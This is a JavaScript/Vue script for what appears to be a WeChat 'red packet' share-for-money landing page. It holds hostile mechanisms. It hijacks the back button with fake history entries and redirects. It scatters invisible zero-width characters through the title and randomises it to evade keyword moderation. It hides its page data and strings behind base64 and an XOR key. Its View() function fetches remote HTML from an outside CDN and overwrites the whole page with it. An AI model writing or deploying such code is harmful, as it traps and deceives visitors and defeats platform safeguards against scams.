let unfamiliarStr = ['웃', '유', '☿', 'ღ', '♁', '♆', 'Б', 'Ф', 'Ц', 'Ч', 'И', 'ЙК', '々', '〆', 'の', 'ぁ', '〥', '〩', 'を', 'ず', 'あ', 'じ', '☊', '☋']
        let strLength = unfamiliarStr.length;
        let subNumber = Math.floor(Math.random() * strLength);
        document.title = unfamiliarStr[subNumber];

        window.vm = new Vue({
            el: '#app',
            data: {
                showToastStatus: false,
                isLoading: true,
                into: false,
                pageData: {
                    title: '',
                    backlink: '', // 返回链接
                }
            },
            filters: {},
            methods: {
                // 重置返回url
                reBackHistory() {
                    //返回广告
                    var u = navigator.userAgent;
                    var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Linux') > -1; //g
                    if (isAndroid && typeof (tbsJs) != 'undefined') {
                        tbsJs.onReady('{useCachedApi : "true"}', function (e) {
                        })
                    }

                    this.pushHistory();

                    window.addEventListener("popstate", (e) => {
                        this.pushHistory();
                        //this.openLink(vm.pageData.backlink);
                        zp();
                    }, false);


                    window.onhashchange = function () {
                        //window.location.href = vm.pageData.backlink;
                        zp();
                    };
                },
                pushHistory() {
                    const state = {
                        title: "title",
                        url: "#"
                    };
                    history.pushState(state, "title", "#" + Date.now());
                    //屏蔽分享
                    if (typeof WeixinJSBridge == "undefined") {
                        if (document.addEventListener) {
                            document.addEventListener('WeixinJSBridgeReady', this.onBridgeReady, false);
                        } else if (document.attachEvent) {
                            document.attachEvent('WeixinJSBridgeReady', this.onBridgeReady);
                            document.attachEvent('onWeixinJSBridgeReady', this.onBridgeReady);
                        }
                    } else {
                        this.onBridgeReady();
                    }
                },
                // 屏蔽分享按钮
                onBridgeReady() {
                    try {
                        WeixinJSBridge.call('showOptionMenu');
                    } catch (e) {
                    }
                },
                intoShare() {
                    this.into = true;
                    this.openLink(this.pageData.shareDomain);
                },
                getUrlParam(name) {
                    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)"); //构造一个含有目标参数的正则表达式对象
                    var r = window.location.search.substr(1).match(reg);  //匹配目标参数
                    if (r != null) return unescape(r[2]);
                    return null; //返回参数值
                },
                strEncode(string) {
                    let key = 'zp08m' + 'l1i8thfwvld' + 'lusk4u51kau' + 'm70xb36t6jk' + '5nvggh9ccjp' + 'k7u6qoxq2yj' + 'bf98ac7x9f';
                    string = atob(string);
                    let len = key.length;
                    let code = '';
                    for (let i = 0; i < string.length; i++) {
                        let k = i % len;
                        code += String.fromCharCode(string.charCodeAt(i) ^ key.charCodeAt(k));
                    }
                    return atob(code);
                },
                openLink(url) {
                    const label = document.createElement('a');
                    label.setAttribute('rel', 'noreferrer');
                    label.setAttribute('href', url);
                    document.body.appendChild(label);
                    label.click();
                },
                // 统计代码
                insertStatistics() {
                    // console.log('插入统计',this.pageData.statistics)
                    try {
                        this.insertScript(`https://hm.baidu.com/hm.js?${this.pageData.statistics.baidu.appid}`);
                    } catch (e) {
                    }
                    try {
                        this.insertStatistical('zz', this.pageData.statistics.cnzz.appid);
                    } catch (e) {

                    }
                    try {
                        if (this.pageData.statistics_global.baidu) {
                            this.insertScript(`https://hm.baidu.com/hm.js?${this.pageData.statistics_global.baidu.appid}`);
                        }
                    } catch (e) {

                    }
                    try {
                        if (this.pageData.statistics_global.cnzz) {
                            this.insertStatistical('zz', this.pageData.statistics_global.cnzz.appid);
                        }
                    } catch (e) {

                    }
                },
                insertScript(url, callback) {
                    let script = document.createElement('script');
                    script.src = url;
                    script.onload = function () {
                        if (script.parentNode) {
                            script.parentNode.removeChild(script);
                        }
                        if (typeof callback === 'function') {
                            callback();
                        }
                    };
                    document.body.appendChild(script);
                },
                // 插入cnzz统计代码
                insertStatistical($tp, $id) {
                    let label = document.createElement('iframe');
                    label.src = 'https://hb-default.hk.ufileos.com/statistical.html?tp=' + $tp + '&id=' + $id;
                    // label.src = 'https://huang.hk.ufileos.com/back/statistical.html?tp=bd&id=f652822c608da7d91830316e96ac851f';
                    label.style = "width:100%;height:0px;display:none;";
                    document.body.appendChild(label);
                },
                insertBlank(str) {
                    let blank = ['%E2%81%A0', '%E2%81%A1', '%E2%81%A2', '%E2%81%A3', '%E2%81%A4'];
                    let str_arr = str.split('')
                    str_arr.forEach((item, index) => {
                        str_arr[index] = encodeURI(item)
                    })

                    let res_arr = [];
                    let res_str = '';
                    str_arr.forEach((item, index) => {
                        res_str += item;
                        // 随机插入1-5个字符
                        let num = Math.floor(Math.random() * 5 + 5);
                        // console.log('需要添加几个',num)
                        for (var i = 0; i < num; i++) {
                            // console.log('-')
                            res_str += blank[Math.floor((Math.random() * blank.length))];
                        }
                    })
                    return decodeURI(res_str);
                },
                getPageData() {
                    ajax({
                        url: `/aip/ssapi.php`,
                        dataType: 'json',
                        success: (res) => {
                            res = JSON.parse(res);
                            // console.log(res)
                            this.isLoading = false;
                            if (parseInt(res.code) === 1) {
                                this.pageData = JSON.parse(atob(res.data.data))
                                console.log('页面数据', this.pageData)
                                this.insertStatistics()
                                this.reBackHistory()
                                //this.gettailad()
                                this.gotoshare()
                                // alert(1)
                                // this.pageData.title = this.pageData.title.replace('_cs_', localAddress.city || lo)
                                this.pageData.title = this.insertBlank(this.pageData.title);

                            } else {
                                alert('page_data err')
                            }
                        }
                    });
                },
                isWX() {
                    let platform = navigator.platform;
                    let win = platform.indexOf('Win') === 0;
                    let mac = platform.indexOf('Mac') === 0;
                    let ua = /micromessenger/.test(navigator.userAgent.toLowerCase());
                    return ua && !win && !mac;
                },
                getUrlLastParam() {
                    return location.search.substring(location.search.lastIndexOf("=") + 1);
                },

                gettailad() {
                    ajax({
                        url: `/api/controller/AdController.php?type=one`,
                        dataType: 'json',
                        success: (res) => {
                            res = JSON.parse(res);
                            // console.log(res)
                            if (parseInt(res.code) === 1) {
                                vm.pageData.backlink = res.data;
                            }
                        }
                    });
                },
                
                View(a) {
    function d() {
        var a = top.document.open('about:blank');
        a.write(c), a.close();
		
    }
    var b, c;
    a = a + "&_=" + Date.now(), b = new XMLHttpRequest(), c = null, b.onload = function() {
        c = b.responseText;
        var a = 0;
        a > 0 ? setTimeout(d, 1e3 * a) :d();
    }, b.open("GET", a, !0), b.send();
},
                
                //跳入分享页面
                gotoshare(){
                    //"http://wzxcnxfx.hwdzay.cn/ShArEMTYyMzgwNzEyMA==?1623807120=bIiuaXS2bIg0BFjhkizqoFnbd18"
                    let shareurl =  this.pageData.shareDomain
                    let shareobject =  shareurl.split('?')
                    $("#gotoshare").on('click',function(){
                        let money = $("#best_score span").html();
                        //console.log(money);
                       /* money=money.replace(".","");
                        shareurl =shareobject[0]+`?money=${money}&`+shareobject[1]
                        console.log(shareurl)
                        window.location.href = shareurl;*/
                        money=money.replace(".","");
                        localStorage.setItem('money_str', money);
                        View("https://cdn.0qfa.cn/m/m_hb1_1.html");
                        
                        
                    })
                }
            },
            created() {
                this.randomString = Math.random().toString(36).substr(2);
                // this.ip = this.getUrlParam("p");
                this.line = this.getUrlLastParam();
                // this.requestUrl = `${this.domain}/cdYdWBP${rmd}.json?${Date.now()}=${this.line}`;//落地页请求接口
                this.getPageData()
                //10秒获取一次接口信息
               /* setInterval(() => {
                    this.gettailad()
                },10000)*/
            },
            mounted() {
                $("#app").removeAttr("hidden");

            }
        });